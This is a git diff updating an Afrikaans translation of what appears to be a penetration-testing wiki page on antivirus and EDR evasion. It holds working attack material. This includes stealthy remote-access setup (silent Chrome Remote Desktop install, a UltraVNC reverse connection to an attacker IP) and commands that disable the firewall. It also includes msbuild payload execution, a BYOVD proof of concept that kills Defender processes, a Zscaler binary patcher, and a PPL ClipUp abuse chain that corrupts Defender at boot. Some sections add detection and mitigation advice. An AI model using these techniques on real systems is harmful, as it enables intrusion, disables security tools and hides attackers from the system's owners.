-As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), it's possible to execute malicious code using other languages by giving the compromised machine access **to the interpreter environment installed on the Attacker Controlled SMB share**.
+Soos voorgestel in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), is dit moontlik om kwaadwillige kode in ander tale uit te voer deur die gekompromitteerde masjien toegang te gee tot die interpreter-omgewing wat op die Attacker Controlled SMB share geïnstalleer is.
 
-Deur die gekompromitteerde masjien toegang te gee tot die Interpreter Binaries en die omgewing op die SMB-share, kan jy **arbitrêre kode in hierdie tale binne die geheue** van die gekompromitteerde masjien uitvoer.
+Deur toegang tot die Interpreter Binaries en die omgewing op die SMB share toe te laat, kan jy ewekansige kode in hierdie tale in die geheue van die gekompromitteerde masjien uitvoer.
 
-Die repo dui aan: Defender scan steeds die skripte, maar deur Go, Java, PHP ens. te gebruik het ons **meer buigbaarheid om statiese handtekeninge te omseil**. Toetsing met ewekansige on-obfuskated reverse shell-skripte in hierdie tale het sukses getoon.
+Die repo dui aan: Defender scan nog steeds die skripte, maar deur Go, Java, PHP ens. te gebruik, het ons meer buigbaarheid om statiese handtekeninge te omseil. Toetsing met lukrake onverduisterde reverse shell-skripte in hierdie tale het sukses getoon.
 
 ## TokenStomping
 
-Token stomping is 'n tegniek wat 'n aanvaller toelaat om **die toegangstoken of 'n sekuriteitsproduk soos 'n EDR of AV te manipuleer**, wat hulle in staat stel om die bevoegdhede te verlaag sodat die proses nie sal sterf nie maar ook nie die toestemmings het om na kwaadwillige aktiwiteite te kyk nie.
+Token stomping is 'n tegniek wat 'n aanvaller toelaat om die toegangstoken of 'n sekuriteitsproduk soos 'n EDR of AV te **manipuleer**, wat hulle in staat stel om die bevoegdhede daarvan te verminder sodat die proses nie sterf nie, maar nie die permisies het om na kwaadwillige aktiwiteite te kyk nie.
 
-Om dit te voorkom, kan Windows **voorkom dat eksterne prosesse** handvatsels oor die tokens van sekuriteitsprosesse kry.
+Om dit te voorkom, kan Windows verhoed dat eksterne prosesse handvatsels oor die tokens van sekuriteitsprosesse kry.
 
 - [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
 - [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
@@ -510,19 +536,19 @@ Om dit te voorkom, kan Windows **voorkom dat eksterne prosesse** handvatsels oor
 
 ### Chrome Remote Desktop
 
-As described in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), dit is eenvoudig om Chrome Remote Desktop op 'n slagoffer se rekenaar te installeer en dit dan te gebruik om dit oor te neem en volhoubaarheid te behou:
-1. Download vanaf https://remotedesktop.google.com/, klik op "Set up via SSH", en klik dan op die MSI-lêer vir Windows om die MSI-lêer af te laai.
-2. Draai die installateur stil in die slagoffer (admin benodig): `msiexec /i chromeremotedesktophost.msi /qn`
-3. Gaan terug na die Chrome Remote Desktop-bladsy en klik volgende. Die wizard sal jou dan vra om te authoriseer; klik die Authorize-knoppie om voort te gaan.
-4. Voer die gegewe parameter met 'n paar aanpassings uit: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Let op die pin-parameter wat toelaat om die pin sonder die GUI te stel).
+Soos beskryf in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), is dit maklik om net Chrome Remote Desktop op 'n slagoffer se rekenaar te installeer en dit te gebruik om dit oor te neem en volhoubaarheid te behou:
+1. Laai af vanaf https://remotedesktop.google.com/, klik op "Set up via SSH", en klik dan op die MSI-lêer vir Windows om die MSI-lêer af te laai.
+2. Voer die installateur stil in die slagoffer uit (admin benodig): `msiexec /i chromeremotedesktophost.msi /qn`
+3. Gaan terug na die Chrome Remote Desktop-bladsy en klik volgende. Die wizard sal jou vra om te magtig; klik die Authorize-knoppie om voort te gaan.
+4. Voer die gegewe parameter met sommige aanpassings uit: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Let op die pin-parameter wat toelaat om die pin te stel sonder om die GUI te gebruik).
 
 ## Advanced Evasion
 
-Evasion is 'n baie ingewikkelde onderwerp; soms moet jy baie verskillende bronne van telemetrie in net een stelsel in ag neem, so dit is byna onmoontlik om heeltemal onaangeroer te bly in volwasse omgewings.
+Evasion is 'n baie ingewikkelde onderwerp; soms moet jy baie verskillende bronne van telemetrie in net een stelsel in ag neem, so dit is amper onmoontlik om heeltemal onopgespoor te bly in volwassen omgewings.
 
-Elke omgewing wat jy teëkom sal sy eie sterk- en swakpunte hê.
+Elke omgewing teen wie jy werk sal sy eie sterk- en swakpunte hê.
 
-Ek moedig jou sterk aan om hierdie praatjie van [@ATTL4S](https://twitter.com/DaniLJ94) te kyk om 'n ingang in meer Advanced Evasion-tegnieke te kry.
+Ek beveel sterk aan dat jy hierdie praatjie van [@ATTL4S](https://twitter.com/DaniLJ94) kyk om 'n introductie te kry tot meer gevorderde Evasion-tegnieke.
 
 
 {{#ref}}
@@ -536,24 +562,24 @@ Dit is ook nog 'n goeie praatjie van [@mariuszbit](https://twitter.com/mariuszbi
 https://www.youtube.com/watch?v=IbA7Ung39o4
 {{#endref}}
 
-## **Old Techniques**
+## **Oud Tegnieke**
 
-### **Check which parts Defender finds as malicious**
+### **Kyk watter dele Defender as kwaadwillig vind**
 
-Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik wat dele van die binary **verwyder** totdat dit **uitvind watter deel Defender** as kwaadwillig vind en dit vir jou uitsplits.\
-Nog 'n hulpmiddel wat dieselfde doen is [**avred**](https://github.com/dobin/avred) met 'n oop webdiens wat die diens aanbied by [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)
+Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik wat dele van die binary sal verwyder totdat dit uitsonder watter deel Defender as kwaadwillig beskou en dit vir jou uiteensit.\
+Nog 'n instrument wat dieselfde doen is [**avred**](https://github.com/dobin/avred) met 'n oop webdiens by [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)
 
 ### **Telnet Server**
 
-Tot Windows 10 het alle Windows-weergawes met 'n **Telnet server** gekom wat jy (as administrator) kon installeer deur:
+Tot Windows 10 het alle Windows met 'n **Telnet server** gekom wat jy as administrateur kon installeer deur:
 ```bash
 pkgmgr /iu:"TelnetServer" /quiet
 ```
-Laat dit **begin** wanneer die stelsel opstart en **voer** dit nou uit:
+Laat dit **begin** wanneer die stelsel opgestart word en **voer** dit nou uit:
 ```bash
 sc config TlntSVR start= auto obj= localsystem
 ```
-**Verander telnet-poort (onopvallend) en skakel firewall af:**
+**Verander telnet port** (stealth) en skakel die firewall af:
 ```
 tlntadmn config port=80
 netsh advfirewall set allprofiles state off
@@ -562,23 +588,23 @@ netsh advfirewall set allprofiles state off
 
 Laai dit af vanaf: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (jy wil die bin downloads hê, nie die setup nie)
 
-**ON THE HOST**: Voer _**winvnc.exe**_ uit en konfigureer die bediener:
+**OP DIE HOST**: Voer _**winvnc.exe**_ uit en konfigureer die bediener:
 
 - Skakel die opsie _Disable TrayIcon_ aan
 - Stel 'n wagwoord in by _VNC Password_
 - Stel 'n wagwoord in by _View-Only Password_
 
-Skuif dan die binêre _**winvnc.exe**_ en die nuut geskepte lêer _**UltraVNC.ini**_ na die **victim**
+Skuif dan die binary _**winvnc.exe**_ en die **nuut geskepte** lêer _**UltraVNC.ini**_ binne die **victim**
 
 #### **Reverse connection**
 
-Die **attacker** moet op sy **host** die binêre `vncviewer.exe -listen 5900` uitvoer sodat dit voorberei is om 'n reverse **VNC connection** te vang. Dan, binne die **victim**: Begin die winvnc daemon `winvnc.exe -run` en voer `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` uit
+Die **attacker** moet op sy **host** die binary `vncviewer.exe -listen 5900` uitvoer sodat dit **gereed** is om 'n reverse **VNC connection** te vang. Dan, binne die **victim**: Begin die winvnc daemon `winvnc.exe -run` en voer uit `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
 
-**WARNING:** Om stealth te handhaaf, moet jy 'n paar dinge nie doen nie
+**WARNING:** Om stealth te behou mag jy 'n paar dinge nie doen nie
 
-- Moet nie `winvnc` begin as dit reeds loop nie of jy sal 'n [popup](https://i.imgur.com/1SROTTl.png) veroorsaak. Kontroleer of dit loop met `tasklist | findstr winvnc`
-- Moet nie `winvnc` begin sonder `UltraVNC.ini` in dieselfde gids nie, anders sal [die konfigurasie-venster](https://i.imgur.com/rfMQWcf.png) oopmaak
-- Moet nie `winvnc -h` vir hulp hardloop nie, anders sal jy 'n [popup](https://i.imgur.com/oc18wcu.png) veroorsaak
+- Moet nie `winvnc` begin as dit reeds loop nie, anders sal jy 'n [popup](https://i.imgur.com/1SROTTl.png) veroorsaak. Kontroleer of dit loop met `tasklist | findstr winvnc`
+- Moet nie `winvnc` begin sonder `UltraVNC.ini` in dieselfde gids nie, anders sal dit [the config window](https://i.imgur.com/rfMQWcf.png) oopmaak
+- Moet nie `winvnc -h` vir hulp uitvoer nie, anders sal jy 'n [popup](https://i.imgur.com/oc18wcu.png) veroorsaak
 
 ### GreatSCT
 
@@ -604,9 +630,9 @@ Nou **begin die lister** met `msfconsole -r file.rc` en **voer** die **xml paylo
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 ```
-**Die huidige Defender sal die proses baie vinnig beëindig.**
+**Huidige defender sal die proses baie vinnig beëindig.**
 
-### Kompilering van ons eie reverse shell
+### Kompileer ons eie reverse shell
 
 https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
 
@@ -693,7 +719,7 @@ catch (Exception err) { }
 }
 }
 ```
-### C# using kompiler
+### C# using compiler
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
 ```
@@ -728,7 +754,7 @@ i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sec
 - [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
 - [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)
 
-### Gebruik van python vir build injectors voorbeeld:
+### Gebruik python vir build injectors voorbeeld:
 
 - [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)
 
@@ -761,24 +787,24 @@ https://github.com/praetorian-code/vulcan
 
 - [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)
 
-## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR in die kernel-ruimte uitskakel
+## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR vanaf die kernel-ruimte uitskakel
 
-Storm-2603 het 'n klein konsolehulpprogram genaamd **Antivirus Terminator** gebruik om endpoint-beskermings uit te skakel voordat ransomware afgelewer is. Die hulpmiddel bring sy **eie kwesbare maar *signed* driver** en misbruik dit om bevoegde kernel-operasies uit te voer wat selfs Protected-Process-Light (PPL) AV-dienste nie kan blokkeer nie.
+Storm-2603 het 'n klein konsole-hulpmiddel genaamd **Antivirus Terminator** gebruik om endpoint-beskerming uit te skakel voordat ransomware neergesit is. Die tool bring sy **eie kwesbare maar *signed* driver** en misbruik dit om bevoorregte kernel-operasies uit te voer wat selfs Protected-Process-Light (PPL) AV-dienste nie kan blokkeer nie.
 
-Belangrike afleidings
-1. **Signed driver**: Die lêer wat op skyf gelewer word is `ServiceMouse.sys`, maar die binêre is die wettig gesigneerde driver `AToolsKrnl64.sys` van Antiy Labs se “System In-Depth Analysis Toolkit”. Omdat die driver 'n geldige Microsoft-handtekening dra, laai dit selfs wanneer Driver-Signature-Enforcement (DSE) aangeskakel is.
+Belangrike punte
+1. **Signed driver**: Die lêer wat op skyf afgelewer word is `ServiceMouse.sys`, maar die binêre is die legitiem getekende driver `AToolsKrnl64.sys` van Antiy Labs’ “System In-Depth Analysis Toolkit”. Omdat die driver 'n geldige Microsoft-handtekening dra, laai dit selfs wanneer Driver-Signature-Enforcement (DSE) aangeskakel is.
 2. **Service installation**:
 ```powershell
 sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
 sc start  ServiceMouse
 ```
-Die eerste reël registreer die driver as 'n **kernel service** en die tweede begin dit sodat `\\.\ServiceMouse` vanaf user land toegewysbaar word.
+Die eerste reël registreer die driver as 'n **kernel service** en die tweede begin dit sodat `\\.\ServiceMouse` vanaf user land toeganklik raak.
 3. **IOCTLs exposed by the driver**
 | IOCTL code | Capability                              |
 |-----------:|-----------------------------------------|
-| `0x99000050` | Terminering van 'n ewekansige proses per PID (gebruik om Defender/EDR-dienste te stop) |
-| `0x990000D0` | Verwyder 'n ewekansige lêer op skyf |
-| `0x990001D0` | Laai die driver uit en verwyder die diens |
+| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
+| `0x990000D0` | Delete an arbitrary file on disk |
+| `0x990001D0` | Unload the driver and remove the service |
 
 Minimal C proof-of-concept:
 ```c
@@ -792,28 +818,28 @@ CloseHandle(hDrv);
 return 0;
 }
 ```
-4. **Hoekom dit werk**: BYOVD slaan user-mode-beskermings heeltemal oor; kode wat in die kernel uitgevoer word kan *protected* prosesse oopmaak, hulle terminate, of met kernel-objekte knoei ongeag PPL/PP, ELAM of ander verhardingsfunksies.
+4. **Why it works**: BYOVD slaan user-mode beskerming heeltemal oor; kode wat in die kernel uitgevoer word kan *protected* prosesse oopmaak, hulle termineer, of met kernel-objekte knoei ongeag PPL/PP, ELAM of ander verharde funksies.
 
-Opsporing / Mitigasie
-•  Skakel Microsoft se vulnerable-driver bloklys in (`HVCI`, `Smart App Control`) sodat Windows weier om `AToolsKrnl64.sys` te laad.
-•  Moniteer die skepping van nuwe *kernel* dienste en gee waarskuwing wanneer 'n driver van 'n world-writable gids gelaai word of nie op die allow-list is nie.
-•  Kyk vir user-mode handles na pasgemaakte device objects gevolg deur verdagte `DeviceIoControl`-aanroepe.
+Opsporing / Mitigering
+•  Skakel Microsoft se vulnerable-driver block list in (`HVCI`, `Smart App Control`) sodat Windows weier om `AToolsKrnl64.sys` te laai.
+•  Monitor die skepping van nuwe *kernel* dienste en waarsku wanneer 'n driver van 'n wêreld-skryfbare gids gelaai word of nie op die allow-list teenwoordig is nie.
+•  Kyk vir user-mode handles na custom device objects gevolg deur verdagte `DeviceIoControl`-aanroepe.
 
-### Zscaler Client Connector se postuurkontroles omseil via op-skyf binêre patching
+### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching
 
-Zscaler se **Client Connector** pas device-posture-reëls plaaslik toe en vertrou op Windows RPC om die resultate aan ander komponente te kommunikeer. Twee swak ontwerpskeuses maak 'n volledige omseiling moontlik:
+Zscaler’s **Client Connector** pas device-posture-reëls plaaslik toe en vertrou op Windows RPC om die resultate aan ander komponente te kommunikeer. Twee swak ontwerpkeuses maak 'n volledige omseiling moontlik:
 
-1. Postuur-evaluerings gebeur **heeltemal kliëntkant** (’n boolean word na die bediener gestuur).
-2. Interne RPC-endpunte valideer slegs dat die verbindende uitvoerbare lêer **gesigned deur Zscaler** is (via `WinVerifyTrust`).
+1. Posture evaluation gebeur **heeltemal client-side** (a boolean word na die server gestuur).
+2. Internal RPC endpoints valideer slegs dat die verbindende executable **signed by Zscaler** (via `WinVerifyTrust`).
 
-Deur **vier signed binaries op skyf te patch** kan beide meganismes geneutraliseer word:
+Deur **vier signed binaries op disk te patch** kan beide meganismes geneutraliseer word:
 
 | Binary | Original logic patched | Result |
-|--------|------------------------|--------|
-| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gee altyd `1` sodat elke kontrole as voldoen beskou word |
-| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ enige (selfs unsigned) proses kan aan die RPC-pipes bind |
+|--------|------------------------|---------|
+| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gee altyd `1` sodat elke check voldoen |
+| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ enige (selfs unsigned) proses kan aan die RPC pipes bind |
 | `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Vervang deur `mov eax,1 ; ret` |
-| `ZSATunnel.exe` | Integrity checks on the tunnel | Kortgeskakel |
+| `ZSATunnel.exe` | Integrity checks on the tunnel | Kortgesny |
 
 Minimal patcher excerpt:
 ```python
@@ -829,22 +855,22 @@ else:
 f.seek(off)
 f.write(replacement)
 ```
-After replacing the original files and restarting the service stack:
+Na vervanging van die oorspronklike lêers en herbegin van die diensstapel:
 
-* **Alle** posture checks vertoon **green/compliant**.
-* Ongesignede of gemodifiseerde binaries kan die named-pipe RPC-endpunte oopmaak (bv. `\\RPC Control\\ZSATrayManager_talk_to_me`).
-* Die gekompromitteerde gasheer verkry onbeperkte toegang tot die interne netwerk soos deur die Zscaler-beleid gedefinieer.
+* **Alle** houdingkontroles wys **groen/kompliant**.
+* Oondertekende of gemodifiseerde binaries kan die named-pipe RPC endpoints oopmaak (bv. `\\RPC Control\\ZSATrayManager_talk_to_me`).
+* Die gekompromitteerde gasheer kry onbeperkte toegang tot die interne netwerk soos gedefinieer deur die Zscaler-beleide.
 
-Hierdie gevallestudie demonstreer hoe suiwer kliënt-side vertrouensbesluite en eenvoudige handtekeningkontroles met 'n paar byte-patsies omseil kan word.
+Hierdie gevallestudie demonstreer hoe suiwer client-side vertrouensbesluite en eenvoudige handtekeningkontroles met 'n paar byte-patches verslaan kan word.
 
-## Misbruik van Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs
+## Misbruik van Protected Process Light (PPL) om AV/EDR met LOLBINs te manipuleer
 
-Protected Process Light (PPL) afdwing 'n signer/level-hiërargie sodat net beskermde prosesse met gelyke of hoër status mekaar kan manipuleer. Vanuit 'n offensiewe oogpunt, as jy 'n PPL-geskikte binêre lêer legitim kan begin en sy argumente beheer, kan jy onskadelike funksionaliteit (bv. logging) omskep in 'n beperkte, deur PPL gesteunde skryf-primitive teen beskermde gidse wat deur AV/EDR gebruik word.
+Protected Process Light (PPL) afdwing 'n ondertekenaar/vlak hiërargie sodat slegs gelyk-of-hoër beskermde prosesse mekaar kan manipuleer. Aanvallend, as jy 'n wettige PPL-enabled binary kan begin en sy argumente beheer, kan jy onskadelike funksionaliteit (bv. logging) omskep in 'n beperkte, PPL-ondersteunde write primitive teen beskermde directories wat deur AV/EDR gebruik word.
 
 Wat veroorsaak dat 'n proses as PPL uitgevoer word
-- Die teiken EXE (en enige gelaaide DLLs) moet gesigneer wees met 'n PPL-geskikte EKU.
-- Die proses moet geskep word met CreateProcess met die vlae: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
-- 'n Kompatibele beskermingsvlak moet aangevra word wat by die signer van die binêre pas (bv. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` vir anti-malware signers, `PROTECTION_LEVEL_WINDOWS` vir Windows signers). Verkeerde vlakke sal by skepping misluk.
+- Die teiken EXE (en enige gelaaide DLLs) moet onderteken wees met 'n PPL-capable EKU.
+- Die proses moet geskep word met CreateProcess met die flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
+- 'n Kompatibele beskermingsvlak moet aangevra word wat by die ondertekenaar van die binary pas (bv. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` vir anti-malware ondertekenaars, `PROTECTION_LEVEL_WINDOWS` vir Windows-ondertekenaars). Verkeerde vlakke sal by skepping misluk.
 
 Sien ook 'n breër inleiding tot PP/PPL en LSASS-beskerming hier:
 
@@ -852,10 +878,10 @@ Sien ook 'n breër inleiding tot PP/PPL en LSASS-beskerming hier:
 stealing-credentials/credentials-protections.md
 {{#endref}}
 
-Launcher tooling
-- Oopbron-hulpmiddel: CreateProcessAsPPL (kies beskermingsvlak en stuur argumente na die teiken EXE voort):
+Launcher-gereedskap
+- Open-source helper: CreateProcessAsPPL (kies beskermingsvlak en stuur argumente deur na die teiken EXE):
 - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
-- Gebruiksvoorbeeld:
+- Gebruikspatroon:
 ```text
 CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
 # example: spawn a Windows-signed component at PPL level 1 (Windows)
@@ -863,67 +889,67 @@ CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
 # example: spawn an anti-malware signed component at level 3
 CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
 ```
-LOLBIN primitive: ClipUp.exe
-- Die gesigneerde stelsel-binaire `C:\Windows\System32\ClipUp.exe` maak 'n nuwe proses van homself en aanvaar 'n parameter om 'n loglêer na 'n deur die oproeper gespesifiseerde pad te skryf.
-- Wanneer as 'n PPL-proses gelanseer, gebeur die lêerskryf met PPL-ondersteuning.
-- ClipUp kan nie paadjies met spasies ontleed nie; gebruik 8.3-kortpade om na normaalweg beskermde liggings te wys.
+LOLBIN-primitief: ClipUp.exe
+- Die gesigneerde stelsel binary `C:\Windows\System32\ClipUp.exe` spawn self en aanvaar 'n parameter om 'n loglêer na 'n deur die aanroeper-gespesifiseerde pad te skryf.
+- Wanneer as 'n PPL-proses gelanseer, gebeur die lêerskrywing met PPL-ondersteuning.
+- ClipUp kan nie paaie met spasies ontleed nie; gebruik 8.3 kortpaaie om na normaalweg beskermde plekke te wys.
 
-8.3 short path helpers
-- Lys kortname: `dir /x` in elke ouer-gids.
+8.3 kortpad-hulp
+- Lys kortname: `dir /x` in elke ouergids.
 - Bepaal kortpad in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`
 
-Abuse chain (abstract)
-1) Start die PPL-geskikte LOLBIN (ClipUp) met `CREATE_PROTECTED_PROCESS` deur 'n launcher te gebruik (bv. CreateProcessAsPPL).
-2) Gee die ClipUp log-pad-argument om 'n lêerskepping in 'n beskermde AV-gids af te dwing (bv. Defender Platform). Gebruik 8.3-kortname indien nodig.
-3) As die teiken-binary normaalweg deur die AV oop/gesluit is terwyl dit loop (bv. MsMpEng.exe), skeduleer die skryf by opstart voordat die AV begin deur 'n auto-start diens te installeer wat betroubaar vroeër loop. Valideer die opstartvolgorde met Process Monitor (boot logging).
-4) By herlaai gebeur die PPL-ondersteunde skryf voordat die AV sy binaries sluit, wat die teikenlêer korrupteer en die opstart verhinder.
+Misbruik-ketting (opsomming)
+1) Lanseer die PPL-geskikte LOLBIN (ClipUp) met `CREATE_PROTECTED_PROCESS` deur 'n launcher te gebruik (bv., CreateProcessAsPPL).
+2) Gee die ClipUp log-pad argument om 'n lêerskepping in 'n beskermde AV-gids af te dwing (bv., Defender Platform). Gebruik 8.3 kortname indien nodig.
+3) As die teiken binary normaalweg deur die AV oop/gesluit is terwyl dit loop (bv., MsMpEng.exe), skeduleer die skrywing by opstart voordat die AV begin deur 'n auto-start diens te installeer wat betroubaar vroeër loop. Valideer opstart-volgorde met Process Monitor (boot logging).
+4) By herbegin gebeur die PPL-ondersteunde skrywing voordat die AV sy binaries sluit, wat die teikenlêer korrup maak en opstart verhoed.
 
-Example invocation (paths redacted/shortened for safety):
+Voorbeeld-oproep (paaie weggelaat/verkort vir veiligheid):
 ```text
 # Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
 CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
 ```
 Aantekeninge en beperkings
-- Jy kan nie die inhoud wat ClipUp skryf beheer behalwe vir die ligging nie; die primitief is meer geskik vir korrupsie as vir presiese content injection.
-- Vereis plaaslike admin/SYSTEM om 'n diens te installeer/start en 'n herbegin-venster.
-- Tydbepaling is krities: die teiken mag nie oop wees nie; uitvoering by opstart vermy file locks.
+- Jy kan nie die inhoud wat ClipUp skryf buite die plasing beheer nie; die primitief is geskik vir korrupsie eerder as vir presiese inhoudsinspuiting.
+- Vereis plaaslike admin/SYSTEM om 'n diens te installeer/te begin en 'n herbegin-venster.
+- Tyding is krities: die teiken mag nie oop wees nie; uitvoering tydens opstart vermy lêerslotte.
 
-Detections
-- Prosesskepping van `ClipUp.exe` met ongewoonlike argumente, veral wanneer dit deur nie-standaard launchers as ouer geskep word, rondom opstart.
-- Nuwe dienste geconfigureer om verdachte binaries outomaties te begin en wat konsekwent voor Defender/AV begin. Ondersoek diensskepping/wysiging voorafgaande aan Defender-opstartfoute.
+Opsporings
+- Proses-skepping van `ClipUp.exe` met ongewone argumente, veral geparent deur nie-standaard opstarters, rondom opstart.
+- Nuwe dienste gekonfigureer om outo-start binaries te begin en wat konsekwent voor Defender/AV begin. Ondersoek diensskepping/wysiging voorafgaand aan Defender opstart-foute.
 - Lêerintegriteitsmonitering op Defender binaries/Platform-lêergidse; onverwagte lêerskeppings/wysigings deur prosesse met protected-process vlagte.
-- ETW/EDR telemetrie: kyk vir prosesse geskep met `CREATE_PROTECTED_PROCESS` en abnormale gebruik van PPL-vlak deur nie-AV binaries.
+- ETW/EDR-telemetrie: kyk vir prosesse geskep met `CREATE_PROTECTED_PROCESS` en abnormale PPL-vlak gebruik deur nie-AV binaries.
 
-Mitigations
-- WDAC/Code Integrity: beperk watter signed binaries as PPL mag loop en onder watter ouers; blokkeer ClipUp-aanroep buite geldige kontekste.
-- Dienshigiëne: beperk skepping/wysiging van auto-start dienste en monitor begin-volgorde-manipulasie.
-- Verseker Defender tamper protection en early-launch protections is aangeskakel; ondersoek opstartfoute wat binêre korrupsie aandui.
-- Oorweeg om 8.3 short-name generation op volumes wat security tooling huisves te deaktiveer indien dit versoenbaar is met jou omgewing (toets deeglik).
+Mitigeringsmaatreëls
+- WDAC/Code Integrity: beperk watter gesigneerde binaries as PPL mag loop en onder watter ouers; blokkeer ClipUp-aanroep buite geldige kontekste.
+- Dienshigiëne: beperk skepping/wysiging van outo-start dienste en monitor manipulasie van opstartvolgorde.
+- Maak seker Defender tamper protection en early-launch protections is geaktiveer; ondersoek opstartfoute wat na binary-korrupsie wys.
+- Oorweeg om 8.3 kort-naam generasie te deaktiveer op volumes wat security tooling huisves indien versoenbaar met jou omgewing (toets deeglik).
 
-References for PPL and tooling
+Verwysings vir PPL en gereedskap
 - Microsoft Protected Processes oorsig: https://learn.microsoft.com/windows/win32/procthread/protected-processes
 - EKU verwysing: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
 - Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
 - CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
 - Tegniek-beskrywing (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html
 
-## Manipulasie van Microsoft Defender via Platform Version Folder Symlink Hijack
+## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack
 
-Windows Defender kies die platform waarvandaan dit loop deur subgidse onder te enumereer:
+Windows Defender kies die platform waarvandaan dit loop deur subgidse te enumereren onder:
 - `C:\ProgramData\Microsoft\Windows Defender\Platform\`
 
-Dit kies die submap met die hoogste lexikografiese weergawestreng (bv. `4.18.25070.5-0`), en begin dan die Defender-diensprosesse van daar (en werk diens-/registerpaadjies ooreenkomstig by). Hierdie seleksie vertrou gidsinskrywings insluitend directory reparse points (symlinks). 'n Administrateur kan dit misbruik om Defender na 'n deur 'n aanvaller-skryfbare pad te herlei en sodoende DLL sideloading of diensversteuring te bereik.
+Dit kies die subgids met die hoogste leksikografiese weergawestreng (bv. `4.18.25070.5-0`), en begin dan die Defender diensprosesse van daar (en werk diens/registrie-paadjies ooreenkomstig op). Hierdie seleksie vertrou gidsinskrywings insluitend directory reparse points (symlinks). 'n Administrator kan dit benut om Defender na 'n deur 'n aanvaller skryfbare pad te herlei en DLL sideloading of diensontwrigting te bewerkstellig.
 
-Preconditions
-- Plaaslike Administrator (noodsaaklik om gidse/symlinks onder die Platform folder te skep)
-- Vermoë om te herbegin of Defender platform her-seleksie te aktiveer (diensherbegin by opstart)
-- Slegs ingeboude instrumente benodig (mklink)
+Voorvereistes
+- Local Administrator (nodig om gidse/symlinks te skep onder die Platform-gids)
+- Vermoë om te herbegin of Defender platform her-seleksie te trigger (diens herbegin op opstart)
+- Slegs ingeboude gereedskap nodig (mklink)
 
-Why it works
-- Defender blokkeer skryfaksies in sy eie gidse, maar sy platformseleksie vertrou gidsinskrywings en kies die lexikografies hoogste weergawe sonder om te valideer dat die teiken na 'n beskermde/vertroude pad oplos.
+Waarom dit werk
+- Defender blokkeer skryfaksies in sy eie gidse, maar sy platformselektering vertrou gidsinskrywings en kies die leksikografies hoogste weergawe sonder om te valideer dat die teiken na 'n beskermde/betroubare pad oplos.
 
-Step-by-step (example)
-1) Berei 'n skryfbare kloon van die huidige platformgids voor, bv. `C:\TMP\AV`:
